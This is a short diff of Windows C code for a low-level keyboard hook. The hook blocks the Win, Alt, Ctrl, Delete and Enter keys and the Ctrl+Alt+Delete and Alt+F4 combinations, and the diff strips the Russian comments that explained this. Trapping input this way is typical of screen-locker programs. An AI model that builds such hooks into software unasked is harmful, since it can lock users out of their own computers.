@@ -6,23 +6,18 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
 
-        // Блокируем важные клавиши
         if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN ||
-            p->vkCode == VK_MENU ||  // Alt
-            p->vkCode == VK_DELETE ||
-            p->vkCode == VK_CONTROL ||
-            p->vkCode == VK_RETURN) {
-            return 1;  // Блокируем
+            p->vkCode == VK_MENU || p->vkCode == VK_DELETE ||
+            p->vkCode == VK_CONTROL || p->vkCode == VK_RETURN) {
+            return 1;
         }
 
-        // Блокируем комбинации Ctrl+Alt+Del, Ctrl+Shift+Esc и т.д.
         if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
             (GetAsyncKeyState(VK_MENU) & 0x8000) &&
             p->vkCode == VK_DELETE) {
             return 1;
         }
 
-        // Блокируем Alt+F4
         if ((GetAsyncKeyState(VK_MENU) & 0x8000) && p->vkCode == VK_F4) {
             return 1;
         }
